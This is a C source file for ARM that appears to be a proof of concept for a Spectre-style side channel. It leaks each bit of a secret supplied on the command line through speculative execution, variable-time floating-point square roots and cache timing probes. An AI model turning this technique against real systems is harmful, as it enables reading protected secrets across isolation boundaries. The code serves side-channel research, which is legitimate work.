#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arm_neon.h>
#include "timing.h"
#include "cache.h"
#include <assert.h>
#include <string.h>
// #include <x86intrin.h>
// #include <xmmintrin.h>

#define FAST 0x0000000000000
#define SLOW 0x0010deadbeef1337
#define SIZE 256
#define STRIDE 512

int leakValue(int, int bit);


int global_variable __attribute__((aligned(2048))) = 0xbeefbeef;
uint8_t array[SIZE * STRIDE] __attribute__((aligned(2048)));
cache_ctx_t arr_context __attribute__((aligned(2048)));
cache_ctx_t global_variable_context __attribute__((aligned(2048)));
cache_ctx_t secret_context __attribute__((aligned(2048)));



//32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25

//big_array has to be this size!
//static uint32_t big_array[33554432] __attribute__((aligned(128)));

void victim_function(register int secret_val, register int bit, int isPublic)
{
    if (isPublic < array[0x2 * STRIDE]) {
        uint64_t tmp = (((secret_val >> bit) & 1) * FAST) + (!((secret_val >> bit) & 1)* SLOW);

        double tmp2;
        memcpy((void*)&tmp2, (void *)&tmp, sizeof(tmp2));
        tmp2 = tmp2 * tmp2;

        asm volatile ("fmov d0, %x0" :: "r"(tmp2));


        asm volatile (
            ".rept 44\n\t"  
            "fsqrt d0, d0\n\t"  
            "fmul d0, d0, d0\n\t"
            ".endr\n\t"
        );
        
        asm volatile ("fmov %0, d0" : "=r"(tmp2));
        asm volatile (
          "mov %0, %1"  
          : "=r" (tmp)  
          : "r" (tmp2)  
          :             
          );
        void * addr = &global_variable;
        memory_access(addr);

  }

  return ;
}




void setup(){
    for (int i = 0; i < sizeof(array); i++)
        array[i] = 0x0;
    array[0x2 * STRIDE] = 10;

    arr_context = cache_remove_prepare(&array[0x2 * STRIDE]);
    global_variable_context = cache_remove_prepare(&global_variable);

    return;
}


int leakValue(int secret, int bit){


    int num_hits = 0 ;

    memory_fence();
    
     
    for(int i = VICTIM_CALLS; i >= 0; i--){ // do VICTIM_CALLS calls to the victim function (per measurement)
        int x = (i == 0) * 100;
        cache_remove(arr_context);
        cache_remove(global_variable_context);
        cache_remove(arr_context);
        cache_remove(global_variable_context);
        memory_fence();

        victim_function(secret, bit, x);
        memory_fence();

    }
        
    uint64_t time;

    time = probe(&global_variable);
   
    num_hits += (time); // && time makes sure the time wasn't 0 (0 = the timer is not running)
    
    
    return num_hits;
}


int main(int argc, char *argv[])
{
  timer_start();

  //printf("[Spectre Variant %d for Variable Time Instructions]\n", VARIANT);

  int secret = atoi(argv[1]);
  int guess = 0;

  uint64_t result[32] = {0};

  memory_fence();

  //puts(" ---- SETUP ---- ");
  //fflush(stdout);
      
  setup();

  memory_fence();


  for (volatile int i = 0; i < 32; i++) {
    result[i] = leakValue(secret, i);
  }
  
  for (int i = 0; i < 32; i++)
    printf("%3lld ", result[i]);
  //printf("Guess : %3d, --> %d\n", guess, guess == secret ? 1 : 0);

    timer_stop();

}

